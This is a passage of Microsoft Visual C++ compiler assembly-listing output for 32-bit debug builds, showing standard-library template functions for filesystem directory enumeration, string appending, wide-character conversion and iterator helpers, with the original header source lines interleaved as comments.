  00061	8b 55 f4	 mov	 edx, DWORD PTR __Rx$[ebp]
  00064	52		 push	 edx
  00065	8b 45 f4	 mov	 eax, DWORD PTR __Rx$[ebp]
  00068	83 c0 10	 add	 eax, 16			; 00000010H
  0006b	50		 push	 eax
  0006c	e8 00 00 00 00	 call	 ??$addressof@U_Dir_enum_impl@filesystem@std@@@std@@YAPAU_Dir_enum_impl@filesystem@0@AAU120@@Z ; std::addressof<std::filesystem::_Dir_enum_impl>
  00071	83 c4 04	 add	 esp, 4
  00074	50		 push	 eax
  00075	8d 4d e4	 lea	 ecx, DWORD PTR __Ret$[ebp]
  00078	e8 00 00 00 00	 call	 ??$_Set_ptr_rep_and_enable_shared@U_Dir_enum_impl@filesystem@std@@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@AAEXQAU_Dir_enum_impl@filesystem@1@QAV_Ref_count_base@1@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::_Set_ptr_rep_and_enable_shared<std::filesystem::_Dir_enum_impl>

; 2741 :     return _Ret;

  0007d	8d 4d e4	 lea	 ecx, DWORD PTR __Ret$[ebp]
  00080	51		 push	 ecx
  00081	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  00084	e8 00 00 00 00	 call	 ??0?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@$$QAV01@@Z ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::shared_ptr<std::filesystem::_Dir_enum_impl>
  00089	8d 4d e4	 lea	 ecx, DWORD PTR __Ret$[ebp]
  0008c	e8 00 00 00 00	 call	 ??1?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAE@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::~shared_ptr<std::filesystem::_Dir_enum_impl>
  00091	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 2742 : }

  00094	8b e5		 mov	 esp, ebp
  00096	5d		 pop	 ebp
  00097	c3		 ret	 0
??$make_shared@U_Dir_enum_impl@filesystem@std@@U_Creator@123@ABW4directory_options@23@@std@@YA?AV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@0@$$QAU_Creator@_Dir_enum_impl@filesystem@0@ABW4directory_options@40@@Z ENDP ; std::make_shared<std::filesystem::_Dir_enum_impl,std::filesystem::_Dir_enum_impl::_Creator,enum std::filesystem::directory_options const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??$append@V?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z
_TEXT	SEGMENT
__As_view$ = -20					; size = 8
_this$ = -12						; size = 4
tv76 = -8						; size = 4
tv78 = -4						; size = 4
__Right$ = 8						; size = 4
??$append@V?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append<std::basic_string_view<char,std::char_traits<char> >,0>, COMDAT
; _this$ = ecx

; 3289 :     _CONSTEXPR20 basic_string& append(const _StringViewIsh& _Right) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 14	 sub	 esp, 20			; 00000014H
  00006	89 4d f4	 mov	 DWORD PTR _this$[ebp], ecx

; 3290 :         const basic_string_view<_Elem, _Traits> _As_view = _Right;

  00009	8b 45 08	 mov	 eax, DWORD PTR __Right$[ebp]
  0000c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0000e	8b 50 04	 mov	 edx, DWORD PTR [eax+4]
  00011	89 4d ec	 mov	 DWORD PTR __As_view$[ebp], ecx
  00014	89 55 f0	 mov	 DWORD PTR __As_view$[ebp+4], edx

; 3291 :         return append(_As_view.data(), _Convert_size<size_type>(_As_view.size()));

  00017	8d 4d ec	 lea	 ecx, DWORD PTR __As_view$[ebp]
  0001a	e8 00 00 00 00	 call	 ?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ ; std::basic_string_view<char,std::char_traits<char> >::size
  0001f	50		 push	 eax
  00020	e8 00 00 00 00	 call	 ??$_Convert_size@II@std@@YAII@Z ; std::_Convert_size<unsigned int,unsigned int>
  00025	83 c4 04	 add	 esp, 4
  00028	89 45 fc	 mov	 DWORD PTR tv78[ebp], eax
  0002b	8d 4d ec	 lea	 ecx, DWORD PTR __As_view$[ebp]
  0002e	e8 00 00 00 00	 call	 ?data@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEPBDXZ ; std::basic_string_view<char,std::char_traits<char> >::data
  00033	89 45 f8	 mov	 DWORD PTR tv76[ebp], eax
  00036	8b 45 fc	 mov	 eax, DWORD PTR tv78[ebp]
  00039	50		 push	 eax
  0003a	8b 4d f8	 mov	 ecx, DWORD PTR tv76[ebp]
  0003d	51		 push	 ecx
  0003e	8b 4d f4	 mov	 ecx, DWORD PTR _this$[ebp]
  00041	e8 00 00 00 00	 call	 ?append@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV12@QBDI@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append

; 3292 :     }

  00046	8b e5		 mov	 esp, ebp
  00048	5d		 pop	 ebp
  00049	c2 04 00	 ret	 4
??$append@V?$basic_string_view@DU?$char_traits@D@std@@@std@@$0A@@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAEAAV01@ABV?$basic_string_view@DU?$char_traits@D@std@@@1@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::append<std::basic_string_view<char,std::char_traits<char> >,0>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??$?0ABV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@_W@1@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
___formal$ = 8						; size = 1
__Val1$ = 12						; size = 4
??$?0ABV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@_W@1@@Z PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>, COMDAT
; _this$ = ecx

; 1528 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 0c	 mov	 eax, DWORD PTR __Val1$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$forward@ABV?$allocator@_W@std@@@std@@YAABV?$allocator@_W@0@ABV10@@Z ; std::forward<std::allocator<wchar_t> const &>
  00010	83 c4 04	 add	 esp, 4
  00013	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00016	e8 00 00 00 00	 call	 ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
  0001b	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001e	8b e5		 mov	 esp, ebp
  00020	5d		 pop	 ebp
  00021	c2 08 00	 ret	 8
??$?0ABV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@_W@1@@Z ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Convert_Source_to_wide@V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@U_Normal_conversion@filesystem@2@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z
_TEXT	SEGMENT
$T1 = -8						; size = 8
___$ReturnUdt$ = 8					; size = 4
__Source$ = 12						; size = 4
__Tag$ = 16						; size = 1
??$_Convert_Source_to_wide@V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@U_Normal_conversion@filesystem@2@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z PROC ; std::filesystem::_Convert_Source_to_wide<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,std::filesystem::_Normal_conversion>, COMDAT

; 280  :     _NODISCARD wstring _Convert_Source_to_wide(const _Src& _Source, _Conversion _Tag = {}) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8

; 281  :         return _Convert_stringoid_to_wide(_Stringoid_from_Source(_Source), _Tag);

  00006	0f b6 45 10	 movzx	 eax, BYTE PTR __Tag$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d 0c	 mov	 ecx, DWORD PTR __Source$[ebp]
  0000e	51		 push	 ecx
  0000f	8d 55 f8	 lea	 edx, DWORD PTR $T1[ebp]
  00012	52		 push	 edx
  00013	e8 00 00 00 00	 call	 ??$_Stringoid_from_Source@_WU?$char_traits@_W@std@@@filesystem@std@@YA?A_PABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@@Z ; std::filesystem::_Stringoid_from_Source<wchar_t,std::char_traits<wchar_t> >
  00018	83 c4 08	 add	 esp, 8
  0001b	8b 48 04	 mov	 ecx, DWORD PTR [eax+4]
  0001e	51		 push	 ecx
  0001f	8b 10		 mov	 edx, DWORD PTR [eax]
  00021	52		 push	 edx
  00022	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00025	50		 push	 eax
  00026	e8 00 00 00 00	 call	 ??$_Convert_stringoid_to_wide@U_Normal_conversion@filesystem@std@@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z ; std::filesystem::_Convert_stringoid_to_wide<std::filesystem::_Normal_conversion>
  0002b	83 c4 10	 add	 esp, 16			; 00000010H
  0002e	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 282  :     }

  00031	8b e5		 mov	 esp, ebp
  00033	5d		 pop	 ebp
  00034	c3		 ret	 0
??$_Convert_Source_to_wide@V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@U_Normal_conversion@filesystem@2@@filesystem@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@1@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@1@U_Normal_conversion@01@@Z ENDP ; std::filesystem::_Convert_Source_to_wide<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,std::filesystem::_Normal_conversion>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??$_Convert_wide_to@U?$char_traits@D@std@@V?$allocator@D@2@D@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Input$ = 12						; size = 8
__Al$ = 20						; size = 4
??$_Convert_wide_to@U?$char_traits@D@std@@V?$allocator@D@2@D@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z PROC ; std::filesystem::_Convert_wide_to<std::char_traits<char>,std::allocator<char>,char>, COMDAT

; 148  :     _NODISCARD basic_string<_EcharT, _Traits, _Alloc> _Convert_wide_to(const wstring_view _Input, const _Alloc& _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 149  :         if constexpr (is_same_v<_EcharT, char>) {
; 150  :             return _Convert_wide_to_narrow<_Traits>(__std_fs_code_page(), _Input, _Al);

  00003	8b 45 14	 mov	 eax, DWORD PTR __Al$[ebp]
  00006	50		 push	 eax
  00007	8b 4d 10	 mov	 ecx, DWORD PTR __Input$[ebp+4]
  0000a	51		 push	 ecx
  0000b	8b 55 0c	 mov	 edx, DWORD PTR __Input$[ebp]
  0000e	52		 push	 edx
  0000f	e8 00 00 00 00	 call	 ___std_fs_code_page@0
  00014	50		 push	 eax
  00015	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
  00018	50		 push	 eax
  00019	e8 00 00 00 00	 call	 ??$_Convert_wide_to_narrow@U?$char_traits@D@std@@V?$allocator@D@2@@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@W4__std_code_page@@V?$basic_string_view@_WU?$char_traits@_W@std@@@0@ABV?$allocator@D@0@@Z ; std::_Convert_wide_to_narrow<std::char_traits<char>,std::allocator<char> >
  0001e	83 c4 14	 add	 esp, 20			; 00000014H
  00021	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 151  :         }
; 152  : #ifdef __cpp_char8_t
; 153  :         else if constexpr (is_same_v<_EcharT, char8_t>) {
; 154  :             return _Convert_wide_to_narrow<_Traits>(__std_code_page::_Utf8, _Input, _Al);
; 155  :         }
; 156  : #endif // defined(__cpp_char8_t)
; 157  :         else if constexpr (is_same_v<_EcharT, char32_t>) {
; 158  :             return _Convert_wide_to_utf32<_Traits>(_Input, _Al);
; 159  :         } else { // wchar_t, char16_t
; 160  :             return basic_string<_EcharT, _Traits, _Alloc>(_Input.data(), _Input.data() + _Input.size(), _Al);
; 161  :         }
; 162  :     }

  00024	5d		 pop	 ebp
  00025	c3		 ret	 0
??$_Convert_wide_to@U?$char_traits@D@std@@V?$allocator@D@2@D@filesystem@std@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@V?$basic_string_view@_WU?$char_traits@_W@std@@@1@ABV?$allocator@D@1@@Z ENDP ; std::filesystem::_Convert_wide_to<std::char_traits<char>,std::allocator<char>,char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Seek_wrapped@PB_WPB_W@std@@YAXAAPB_W$$QAPB_W@Z
_TEXT	SEGMENT
__It$ = 8						; size = 4
__UIt$ = 12						; size = 4
??$_Seek_wrapped@PB_WPB_W@std@@YAXAAPB_W$$QAPB_W@Z PROC	; std::_Seek_wrapped<wchar_t const *,wchar_t const *>, COMDAT

; 1285 : constexpr void _Seek_wrapped(_Iter& _It, _UIter&& _UIt) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1286 :     if constexpr (_Wrapped_seekable_v<_Iter, _UIter>) {
; 1287 :         _It._Seek_to(_STD forward<_UIter>(_UIt));
; 1288 :     } else {
; 1289 :         _It = _STD forward<_UIter>(_UIt);

  00003	8b 45 0c	 mov	 eax, DWORD PTR __UIt$[ebp]
  00006	50		 push	 eax
  00007	e8 00 00 00 00	 call	 ??$forward@PB_W@std@@YA$$QAPB_WAAPB_W@Z ; std::forward<wchar_t const *>
  0000c	83 c4 04	 add	 esp, 4
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __It$[ebp]
  00012	8b 10		 mov	 edx, DWORD PTR [eax]
  00014	89 11		 mov	 DWORD PTR [ecx], edx

; 1290 :     }
; 1291 : }

  00016	5d		 pop	 ebp
  00017	c3		 ret	 0
??$_Seek_wrapped@PB_WPB_W@std@@YAXAAPB_W$$QAPB_W@Z ENDP	; std::_Seek_wrapped<wchar_t const *,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Find_unchecked@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z
_TEXT	SEGMENT
__Result$1 = -16					; size = 4
__First_ptr$2 = -12					; size = 4
tv77 = -8						; size = 4
tv79 = -2						; size = 2
__First$ = 8						; size = 4
__Last$ = 12						; size = 4
__Val$ = 16						; size = 4
??$_Find_unchecked@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z PROC ; std::_Find_unchecked<wchar_t const *,wchar_t>, COMDAT

; 5767 : _NODISCARD _CONSTEXPR20 _InIt _Find_unchecked(_InIt _First, const _InIt _Last, const _Ty& _Val) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H

; 5768 :     // find first matching _Val; choose optimization
; 5769 :     // activate optimization for contiguous iterators to most scalar types (possibly const-qualified)
; 5770 :     if constexpr (_Vector_alg_in_find_is_safe<_InIt, _Ty>) {
; 5771 : #if _HAS_CXX20
; 5772 :         if (!_STD is_constant_evaluated())
; 5773 : #endif // _HAS_CXX20
; 5774 :         {
; 5775 :             if (!_STD _Could_compare_equal_to_value_type<_InIt>(_Val)) {

  00006	8b 45 10	 mov	 eax, DWORD PTR __Val$[ebp]
  00009	50		 push	 eax
  0000a	e8 00 00 00 00	 call	 ??$_Could_compare_equal_to_value_type@PB_W_W@std@@YA_NAB_W@Z ; std::_Could_compare_equal_to_value_type<wchar_t const *,wchar_t>
  0000f	83 c4 04	 add	 esp, 4
  00012	0f b6 c8	 movzx	 ecx, al
  00015	85 c9		 test	 ecx, ecx
  00017	75 05		 jne	 SHORT $LN5@Find_unche

; 5776 :                 return _Last;

  00019	8b 45 0c	 mov	 eax, DWORD PTR __Last$[ebp]
  0001c	eb 6f		 jmp	 SHORT $LN1@Find_unche
$LN5@Find_unche:

; 5777 :             }
; 5778 : #if _USE_STD_VECTOR_ALGORITHMS
; 5779 :             const auto _First_ptr = _To_address(_First);

  0001e	8d 55 08	 lea	 edx, DWORD PTR __First$[ebp]
  00021	52		 push	 edx
  00022	e8 00 00 00 00	 call	 ??$_To_address@PB_W@std@@YA?A_PABQB_W@Z ; std::_To_address<wchar_t const *>
  00027	83 c4 04	 add	 esp, 4
  0002a	89 45 f4	 mov	 DWORD PTR __First_ptr$2[ebp], eax

; 5780 :             const auto _Result    = __std_find_trivial(_First_ptr, _To_address(_Last), _Val);

  0002d	8b 45 10	 mov	 eax, DWORD PTR __Val$[ebp]
  00030	66 8b 08	 mov	 cx, WORD PTR [eax]
  00033	66 89 4d fe	 mov	 WORD PTR tv79[ebp], cx
  00037	8d 55 0c	 lea	 edx, DWORD PTR __Last$[ebp]
  0003a	52		 push	 edx
  0003b	e8 00 00 00 00	 call	 ??$_To_address@PB_W@std@@YA?A_PABQB_W@Z ; std::_To_address<wchar_t const *>
  00040	83 c4 04	 add	 esp, 4
  00043	89 45 f8	 mov	 DWORD PTR tv77[ebp], eax
  00046	0f b7 45 fe	 movzx	 eax, WORD PTR tv79[ebp]
  0004a	50		 push	 eax
  0004b	8b 4d f8	 mov	 ecx, DWORD PTR tv77[ebp]
  0004e	51		 push	 ecx
  0004f	8b 55 f4	 mov	 edx, DWORD PTR __First_ptr$2[ebp]
  00052	52		 push	 edx
  00053	e8 00 00 00 00	 call	 ??$__std_find_trivial@$$CB_W_W@@YAPB_WPB_W0_W@Z ; __std_find_trivial<wchar_t const ,wchar_t>
  00058	83 c4 0c	 add	 esp, 12			; 0000000cH
  0005b	89 45 f0	 mov	 DWORD PTR __Result$1[ebp], eax

; 5781 :             if constexpr (is_pointer_v<_InIt>) {
; 5782 :                 return _Result;

  0005e	8b 45 f0	 mov	 eax, DWORD PTR __Result$1[ebp]
  00061	eb 2a		 jmp	 SHORT $LN1@Find_unche

; 5783 :             } else {
; 5784 :                 return _First + (_Result - _First_ptr);
; 5785 :             }
; 5786 : #else // ^^^ _USE_STD_VECTOR_ALGORITHMS / !_USE_STD_VECTOR_ALGORITHMS vvv
; 5787 :             if constexpr (sizeof(_Iter_value_t<_InIt>) == 1) {
; 5788 :                 const auto _First_ptr = _To_address(_First);
; 5789 :                 const auto _Result    = static_cast<remove_reference_t<_Iter_ref_t<_InIt>>*>(
; 5790 :                     _CSTD memchr(_First_ptr, static_cast<unsigned char>(_Val), static_cast<size_t>(_Last - _First)));
; 5791 :                 if constexpr (is_pointer_v<_InIt>) {
; 5792 :                     return _Result ? _Result : _Last;
; 5793 :                 } else {
; 5794 :                     return _Result ? _First + (_Result - _First_ptr) : _Last;
; 5795 :                 }
; 5796 :             }
; 5797 :             // TRANSITION, DevCom-1614562: not trying wmemchr
; 5798 : #endif // ^^^ !_USE_STD_VECTOR_ALGORITHMS ^^^
; 5799 :         }
; 5800 :     }
; 5801 : 
; 5802 :     for (; _First != _Last; ++_First) {

  00063	eb 09		 jmp	 SHORT $LN4@Find_unche
$LN2@Find_unche:
  00065	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00068	83 c0 02	 add	 eax, 2
  0006b	89 45 08	 mov	 DWORD PTR __First$[ebp], eax
$LN4@Find_unche:
  0006e	8b 4d 08	 mov	 ecx, DWORD PTR __First$[ebp]
  00071	3b 4d 0c	 cmp	 ecx, DWORD PTR __Last$[ebp]
  00074	74 14		 je	 SHORT $LN3@Find_unche

; 5803 :         if (*_First == _Val) {

  00076	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  00079	0f b7 02	 movzx	 eax, WORD PTR [edx]
  0007c	8b 4d 10	 mov	 ecx, DWORD PTR __Val$[ebp]
  0007f	0f b7 11	 movzx	 edx, WORD PTR [ecx]
  00082	3b c2		 cmp	 eax, edx
  00084	75 02		 jne	 SHORT $LN6@Find_unche

; 5804 :             break;

  00086	eb 02		 jmp	 SHORT $LN3@Find_unche
$LN6@Find_unche:

; 5805 :         }
; 5806 :     }

  00088	eb db		 jmp	 SHORT $LN2@Find_unche
$LN3@Find_unche:

; 5807 : 
; 5808 :     return _First;

  0008a	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
$LN1@Find_unche:

; 5809 : }

  0008d	8b e5		 mov	 esp, ebp
  0008f	5d		 pop	 ebp
  00090	c3		 ret	 0
??$_Find_unchecked@PB_W_W@std@@YAPB_WPB_WQB_WAB_W@Z ENDP ; std::_Find_unchecked<wchar_t const *,wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Seek_wrapped@PB_WAAPB_W@std@@YAXAAPB_W0@Z
_TEXT	SEGMENT
__It$ = 8						; size = 4
__UIt$ = 12						; size = 4
??$_Seek_wrapped@PB_WAAPB_W@std@@YAXAAPB_W0@Z PROC	; std::_Seek_wrapped<wchar_t const *,wchar_t const * &>, COMDAT

; 1285 : constexpr void _Seek_wrapped(_Iter& _It, _UIter&& _UIt) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1286 :     if constexpr (_Wrapped_seekable_v<_Iter, _UIter>) {
; 1287 :         _It._Seek_to(_STD forward<_UIter>(_UIt));
; 1288 :     } else {
; 1289 :         _It = _STD forward<_UIter>(_UIt);

  00003	8b 45 0c	 mov	 eax, DWORD PTR __UIt$[ebp]
  00006	50		 push	 eax
  00007	e8 00 00 00 00	 call	 ??$forward@AAPB_W@std@@YAAAPB_WAAPB_W@Z ; std::forward<wchar_t const * &>
  0000c	83 c4 04	 add	 esp, 4
  0000f	8b 4d 08	 mov	 ecx, DWORD PTR __It$[ebp]
  00012	8b 10		 mov	 edx, DWORD PTR [eax]
  00014	89 11		 mov	 DWORD PTR [ecx], edx

; 1290 :     }
; 1291 : }

  00016	5d		 pop	 ebp
  00017	c3		 ret	 0
??$_Seek_wrapped@PB_WAAPB_W@std@@YAXAAPB_W0@Z ENDP	; std::_Seek_wrapped<wchar_t const *,wchar_t const * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Get_unwrapped@ABQB_W@std@@YA?A_TABQB_W@Z
_TEXT	SEGMENT
__It$ = 8						; size = 4
??$_Get_unwrapped@ABQB_W@std@@YA?A_TABQB_W@Z PROC	; std::_Get_unwrapped<wchar_t const * const &>, COMDAT

; 1185 :     !_Unwrappable_v<_Iter> || _Has_nothrow_unwrapped<_Iter>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1186 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1187 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1188 :         return _It + 0;

  00003	8b 45 08	 mov	 eax, DWORD PTR __It$[ebp]
  00006	8b 00		 mov	 eax, DWORD PTR [eax]

; 1189 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1190 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1191 :     } else {
; 1192 :         return static_cast<_Iter&&>(_It);
; 1193 :     }
; 1194 : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
??$_Get_unwrapped@ABQB_W@std@@YA?A_TABQB_W@Z ENDP	; std::_Get_unwrapped<wchar_t const * const &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xutility
;	COMDAT ??$_Get_unwrapped@AAPB_W@std@@YA?A_TAAPB_W@Z
_TEXT	SEGMENT
__It$ = 8						; size = 4
??$_Get_unwrapped@AAPB_W@std@@YA?A_TAAPB_W@Z PROC	; std::_Get_unwrapped<wchar_t const * &>, COMDAT

; 1185 :     !_Unwrappable_v<_Iter> || _Has_nothrow_unwrapped<_Iter>) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1186 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1187 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1188 :         return _It + 0;

  00003	8b 45 08	 mov	 eax, DWORD PTR __It$[ebp]
  00006	8b 00		 mov	 eax, DWORD PTR [eax]

; 1189 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1190 :         return static_cast<_Iter&&>(_It)._Unwrapped();
; 1191 :     } else {
; 1192 :         return static_cast<_Iter&&>(_It);
; 1193 :     }
; 1194 : }

  00008	5d		 pop	 ebp
  00009	c3		 ret	 0
??$_Get_unwrapped@AAPB_W@std@@YA?A_TAAPB_W@Z ENDP	; std::_Get_unwrapped<wchar_t const * &>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\memory
;	COMDAT ??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z
_TEXT	SEGMENT
tv70 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -1						; size = 1
__Ptr$ = 8						; size = 4
??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QAE@PAV_Facet_base@1@@Z PROC ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>, COMDAT
; _this$ = ecx

; 3192 :     _CONSTEXPR23 explicit unique_ptr(pointer _Ptr) noexcept : _Mypair(_Zero_then_variadic_args_t{}, _Ptr) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR tv70[ebp], eax
  0000f	8d 4d 08	 lea	 ecx, DWORD PTR __Ptr$[ebp]
  00012	51		 push	 ecx
  00013	0f b6 55 ff	 movzx	 edx, BYTE PTR $T1[ebp]
  00017	52		 push	 edx
  00018	8b 4d f4	 mov	 ecx, DWORD PTR tv70[ebp]
